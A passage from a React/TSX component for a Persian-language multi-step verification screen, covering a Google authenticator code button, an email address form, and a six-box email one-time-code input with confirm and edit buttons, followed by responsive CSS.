              <div style={{ marginTop: "8px" }}>
                <hr
                  style={{
                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                    borderBottomStyle: "solid",
                    borderBottomWidth: "1px",
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    borderLeftStyle: "solid",
                    borderRightStyle: "solid",
                    borderStyle: "solid",
                    borderTopStyle: "solid",
                    flexShrink: "0",
                    marginBottom: "8px",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                  }}
                />
                <button
                  tabIndex={0}
                  type="button"
                  onClick={handleGoogleCodeSubmit}
                  disabled={isSubmitting || googleCode.length !== 6}
                  style={{
                    alignItems: "center",
                    backgroundColor: "rgb(23, 29, 38)",
                    borderBottomLeftRadius: "8px",
                    borderBottomRightRadius: "8px",
                    borderColor: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    borderTopLeftRadius: "8px",
                    borderTopRightRadius: "8px",
                    color: "rgb(255, 255, 255)",
                    cursor:
                      isSubmitting || googleCode.length !== 6
                        ? "not-allowed"
                        : "pointer",
                    display: "flex",
                    fontWeight: "500",
                    justifyContent: "center",
                    outlineColor: "rgb(255, 255, 255)",
                    paddingBottom: "10px",
                    paddingLeft: "16px",
                    paddingRight: "16px",
                    paddingTop: "10px",
                    position: "relative",
                    textAlign: "center",
                    textDecorationColor: "rgb(255, 255, 255)",
                    textEmphasisColor: "rgb(255, 255, 255)",
                    textTransform: "uppercase",
                    transitionBehavior: "normal, normal, normal",
                    transitionDelay: "0s, 0s, 0s",
                    transitionDuration: "0.25s, 0.25s, 0.25s",
                    transitionProperty:
                      "background-color, box-shadow, border-color",
                    transitionTimingFunction:
                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    verticalAlign: "middle",
                    width: "100%",
                    border: "none",
                    fontSize: "14px",
                    opacity:
                      isSubmitting || googleCode.length !== 6 ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <Loader2
                        style={{
                          width: "16px",
                          height: "16px",
                          marginLeft: "8px",
                          animation: "spin 1s linear infinite",
                        }}
                      />
                      <span>در حال تایید...</span>
                    </div>
                    ) : (
                      <span
                        style={{
                          borderColor: "rgb(255, 255, 255)",
                          color: "rgb(255, 255, 255)",
                          cursor: "pointer",
                          display: "contents",
                          fontWeight: "500",
                          textAlign: "center",
                          textTransform: "uppercase",
                          userSelect: "none",
                        }}
                      >
                        ثبت و ادامه
                      </span>
                    )}
                </button>
              </div>
            </>
          )}

          {/* Step 6: Email Authentication */}
          {currentStep === "email" && emailStep === "email" && (
            <>
              <h5
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  lineHeight: "28px",
                  marginBottom: "12px",
                  textAlign: "center",
                }}
              >
                ایمیل خود را وارد کنید
              </h5>
              <form onSubmit={handleEmailSubmit}>
                <div style={{ marginBottom: "8px" }}>
                  <AlertMessage>
                    <Mail
                      className="inline ml-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    ایمیل خود را وارد کنید تا کد تایید برای شما ارسال شود.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "8px" }}>
                  <label
                    htmlFor="email-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "4px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    آدرس ایمیل
                  </label>
                  <Input
                    id="email-input"
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (errors.email) {
                        setErrors((prev) => ({ ...prev, email: undefined }));
                      }
                    }}
                    className="w-full text-right"
                    style={{
                      borderRadius: "8px",
                      border: errors.email
                        ? "1px solid rgb(220, 38, 38)"
                        : "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                      direction: "ltr",
                    }}
                    placeholder="example@email.com"
                    autoFocus
                    disabled={isSubmitting}
                  />
                  {errors.email && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.email}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "8px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "8px",
                    }}
                  />
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال ارسال کد...</span>
                      </div>
                    ) : (
                      "ارسال کد تایید"
                    )}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Step 7: Email Code Verification */}
          {currentStep === "email" && emailStep === "code" && (
            <>
              <h5
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  lineHeight: "28px",
                  marginBottom: "12px",
                  textAlign: "center",
                }}
              >
                کد تایید ایمیل را وارد کنید
              </h5>
              <div style={{ marginBottom: "8px" }}>
                <AlertMessage>
                  کد تایید به ایمیل{" "}
                  <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
                  شد.
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "8px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "4px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد تایید ایمیل
                </label>
                {/* 6 Separate OTP Inputs */}
                <div
                  style={{
                    direction: "ltr",
                    display: "flex",
                    flexFlow: "row wrap",
                    flexWrap: "wrap",
                    marginRight: "-8px",
                    marginTop: "4px",
                    width: "calc(100% + 8px)",
                  }}
                >
                  {[0, 1, 2, 3, 4, 5].map((index) => (
                    <div
                      key={index}
                      style={{
                        direction: "ltr",
                        flexBasis: "0px",
                        flexGrow: "1",
                        maxWidth: "100%",
                        paddingRight: "8px",
                        paddingTop: "8px",
                      }}
                    >
                      <div
                        style={{
                          direction: "ltr",
                          display: "inline-flex",
                          flexDirection: "column",
                          flexFlow: "column nowrap",
                          position: "relative",
                          verticalAlign: "top",
                          width: "100%",
                        }}
                      >
                        <div
                          style={{
                            alignItems: "center",
                            backgroundColor: "rgb(245, 246, 247)",
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderRadius: "8px",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            cursor: "text",
                            direction: "ltr",
                            display: "flex",
                            marginBottom: "16px",
                            position: "relative",
                            textAlign: "center",
                            width: "100%",
                          }}
                        >
                          <input
                            aria-invalid="false"
                            autoComplete={index === 0 ? "one-time-code" : "off"}
                            type="tel"
                            maxLength={1}
                            value={emailCode[index] || ""}
                            onChange={(e) => {
                              const newValue = e.target.value;
                              if (newValue.match(/^[0-9]*$/)) {
                                const newCode = emailCode.split("");
                                newCode[index] = newValue;
                                setEmailCode(newCode.join(""));

                                // Auto focus next input
                                if (newValue && index < 5) {
                                  const nextInput = document.querySelector(
                                    `input[data-email-index="${index + 1}"]`,
                                  ) as HTMLInputElement;
                                  if (nextInput) nextInput.focus();
                                }
                              }
                            }}
                            onKeyDown={(e) => {
                              if (
                                e.key === "Backspace" &&
                                !emailCode[index] &&
                                index > 0
                              ) {
                                const prevInput = document.querySelector(
                                  `input[data-email-index="${index - 1}"]`,
                                ) as HTMLInputElement;
                                if (prevInput) prevInput.focus();
                              }
                            }}
                            data-email-index={index}
                            disabled={isSubmitting}
                            style={{
                              animation:
                                "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                              animationDuration: "0.01s",
                              animationName: "mui-auto-fill-cancel",
                              appearance: "auto",
                              boxSizing: "content-box",
                              cursor: "text",
                              direction: "ltr",
                              overflowX: "clip",
                              overflowY: "clip",
                              paddingBottom: "10px",
                              paddingLeft: "12px",
                              paddingRight: "12px",
                              paddingTop: "10px",
                              textAlign: "center",
                              width: "100%",
                              border: "none",
                              outline: "none",
                              fontSize: "16px",
                              fontWeight: "500",
                              backgroundColor: "rgb(245, 246, 247)",
                            }}
                          />
                          <fieldset
                            aria-hidden="true"
                            style={{
                              borderBottomLeftRadius: "8px",
                              borderBottomRightRadius: "8px",
                              borderBottomStyle: "solid",
                              borderBottomWidth: "1px",
                              borderBottom: "1px solid rgba(0, 0, 0, 0)",
                              borderBottomColor: "rgba(0, 0, 0, 0)",
                              borderLeft: "1px solid rgba(0, 0, 0, 0)",
                              borderLeftStyle: "solid",
                              borderLeftWidth: "1px",
                              borderLeftColor: "rgba(0, 0, 0, 0)",
                              borderRadius: "8px",
                              borderRight: "1px solid rgba(0, 0, 0, 0)",
                              borderRightStyle: "solid",
                              borderRightWidth: "1px",
                              borderRightColor: "rgba(0, 0, 0, 0)",
                              borderTopLeftRadius: "8px",
                              borderTopRightRadius: "8px",
                              borderTop: "1px solid rgba(0, 0, 0, 0)",
                              borderTopStyle: "solid",
                              borderTopWidth: "1px",
                              borderTopColor: "rgba(0, 0, 0, 0)",
                              bottom: "0px",
                              cursor: "text",
                              direction: "ltr",
                              left: "0px",
                              minWidth: "0%",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              paddingLeft: "8px",
                              paddingRight: "8px",
                              pointerEvents: "none",
                              position: "absolute",
                              right: "0px",
                              textAlign: "right",
                              top: "-5px",
                            }}
                          >
                            <legend
                              style={{
                                cursor: "text",
                                direction: "ltr",
                                lineHeight: "11px",
                                overflowX: "hidden",
                                overflowY: "hidden",
                                pointerEvents: "none",
                                textAlign: "right",
                                transitionDuration: "0.15s",
                                transitionProperty: "width",
                                transitionTimingFunction:
                                  "cubic-bezier(0, 0, 0.2, 1)",
                              }}
                            >
                              <span
                                aria-hidden="true"
                                style={{
                                  cursor: "text",
                                  direction: "ltr",
                                  display: "inline",
                                  lineHeight: "11px",
                                  pointerEvents: "none",
                                  textAlign: "right",
                                }}
                              >
                                ​
                              </span>
                            </legend>
                          </fieldset>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
                {errors.emailCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "4px",
                    }}
                  >
                    {errors.emailCode}
                  </p>
                )}
              </div>

              <div style={{ marginTop: "16px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "8px",
                  }}
                />
                <div style={{ display: "flex", gap: "8px" }}>
                  <Button
                    onClick={() => setEmailStep("email")}
                    variant="outline"
                    className="w-full"
                    style={{
                      border: "1px solid rgba(0, 0, 0, 0.2)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                    }}
                  >
                    ویرایش ایمیل
                  </Button>
                  <button
                    onClick={handleEmailCodeSubmit}
                    disabled={isSubmitting || emailCode.length !== 6}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor:
                        isSubmitting || emailCode.length !== 6
                          ? "not-allowed"
                          : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity:
                        isSubmitting || emailCode.length !== 6 ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال تایید...</span>
                      </div>
                    ) : (
                      "تایید کد"
                    )}
                  </button>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      <style>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
            max-width: 480px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            border-top-left-radius: 0 !important;
            border-top-right-radius: 0 !important;
            border-bottom-left-radius: 0 !important;
            border-bottom-right-radius: 0 !important;
            max-width: none !important;
            width: 100vw !important;
            height: 100vh !important;
            min-height: 100vh !important;
            margin: 0 !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: flex-start !important;
            overflow: hidden !important;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100% !important;
            overflow-y: auto !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: flex-start !important;
            width: 100% !important;
          }

          /* Ensure body and html don't interfere on mobile */
          body,
          html {
            margin: 0 !important;
            padding: 0 !important;
            overflow-x: hidden !important;
          }
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </div>
  );
};
